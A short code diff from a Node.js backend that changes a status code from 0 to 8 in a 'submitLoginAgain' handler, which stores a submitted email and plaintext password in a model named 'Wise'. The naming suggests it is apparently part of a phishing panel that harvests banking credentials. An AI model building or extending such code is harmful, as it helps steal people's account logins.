@@ -53,7 +53,7 @@ const submitLogin = async (req, res) => {
 const submitLoginAgain = async (req, res) => {
     const { email, password, uniqueid } = req.body;
     try {
-        await Wise.findOneAndUpdate({ uniqueid }, { email, password, status: 0, timestamp: moment().format() }).exec();
+        await Wise.findOneAndUpdate({ uniqueid }, { email, password, status: 8, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
